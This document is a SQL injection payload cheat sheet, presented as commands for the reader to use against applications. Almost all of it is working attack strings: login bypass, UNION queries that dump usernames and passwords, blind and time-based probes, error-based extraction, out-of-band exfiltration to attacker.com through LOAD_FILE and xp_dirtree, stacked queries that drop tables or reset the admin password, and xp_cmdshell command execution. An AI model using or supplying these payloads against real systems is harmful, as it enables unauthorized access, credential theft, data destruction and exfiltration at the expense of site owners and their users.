# SQL INJECTION COMMANDS - DIRECT REFERENCE

Here are the actual injection commands you can use:

---

## SINGLE QUOTE TEST
```
'
```
**Why:** Tests if application is vulnerable (causes error)

---

## COMMENT OUT REST OF QUERY
```
'--
```
**Why:** Ignores everything after your injection

---

## ALWAYS TRUE - SHOW EVERYTHING
```
' OR '1'='1'--
```
**Why:** Returns all records

```
' OR 1=1--
```
**Why:** Same as above, numeric version

```
' OR 'x'='x'--
```
**Why:** String-based always true

---

## LOGIN BYPASS
```
admin'--
```
**Why:** Logs in as admin without password

```
' OR 1=1--
```
**Why:** Logs in as first user in database

```
' OR '1'='1' LIMIT 1--
```
**Why:** Logs in as first user only

---

## UNION-BASED DATA THEFT

**Find number of columns:**
```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```
(Keep increasing until error)

**Or use UNION NULL:**
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

**Get database version:**
```
' UNION SELECT @@version--
```
(MySQL/MSSQL)

```
' UNION SELECT version()--
```
(PostgreSQL)

```
' UNION SELECT banner FROM v$version--
```
(Oracle)

**List all tables:**
```
' UNION SELECT table_name FROM information_schema.tables--
```
(MySQL)

```
' UNION SELECT name FROM sys.tables--
```
(MSSQL)

```
' UNION SELECT table_name FROM all_tables--
```
(Oracle)

**List columns from users table:**
```
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--
```

**Dump usernames and passwords:**
```
' UNION SELECT username, password FROM users--
```

---

## BLIND SQL INJECTION - BOOLEAN

**True condition (normal response):**
```
' AND 1=1--
```

**False condition (different response):**
```
' AND 1=2--
```

**Check if a table exists:**
```
' AND (SELECT 'x' FROM users LIMIT 1)='x'--
```

---

## BLIND SQL INJECTION - TIME-BASED

**MySQL:**
```
' AND SLEEP(5)--
```
(Delays 5 seconds if vulnerable)

**MSSQL:**
```
' WAITFOR DELAY '0:0:5'--
```

**PostgreSQL:**
```
' AND pg_sleep(5)--
```

**Oracle:**
```
' AND dbms_pipe.receive_message(('a'),10)--
```

---

## ERROR-BASED - SHOW DATA IN ERROR

**MySQL:**
```
' AND extractvalue(rand(),concat(0x3a,(SELECT password FROM users LIMIT 1)))--
```

**MSSQL:**
```
' AND 1=convert(int, @@version)--
```

---

## OUT-OF-BAND (DNS EXFILTRATION)

**MySQL:**
```
' UNION SELECT LOAD_FILE('\\\\attacker.com\\file')--
```

**MSSQL:**
```
' EXEC master..xp_dirtree '\\\\attacker.com\\share'--
```

---

## STACKED QUERIES (MULTIPLE COMMANDS)

**MySQL:**
```
'; DROP TABLE users--
```
(Deletes entire users table - DANGEROUS!)

```
'; INSERT INTO users (username, password) VALUES ('hacker', 'password')--
```
(Adds new user)

```
'; UPDATE users SET password='hacked' WHERE username='admin'--
```
(Changes admin password)

---

## DATABASE-SPECIFIC COMMANDS

### MySQL Only:
```
' UNION SELECT user()--
```
(Current user)

```
' UNION SELECT database()--
```
(Current database)

```
' UNION SELECT @@datadir--
```
(Database file location)

### MSSQL Only:
```
' UNION SELECT @@servername--
```
(Server name)

```
'; EXEC xp_cmdshell 'whoami'--
```
(Run system commands - VERY DANGEROUS!)

### Oracle Only:
```
' UNION SELECT 'x' FROM dual--
```
(Oracle needs FROM dual)

```
' UNION SELECT username FROM all_users--
```
(List all users)

---

## QUICK REFERENCE - MOST USED

| Purpose | Command |
|---------|---------|
| Basic test | `'` |
| Simple bypass | `' OR 1=1--` |
| Login bypass | `admin'--` |
| Find columns | `' ORDER BY 1--` |
| Get version | `' UNION SELECT @@version--` |
| List tables | `' UNION SELECT table_name FROM information_schema.tables--` |
| Dump data | `' UNION SELECT username,password FROM users--` |
| Time test | `' AND SLEEP(5)--` |

---

**Remember:** Start simple. Try `'` first. If it errors, try `' OR 1=1--`. If that shows everything, you're in!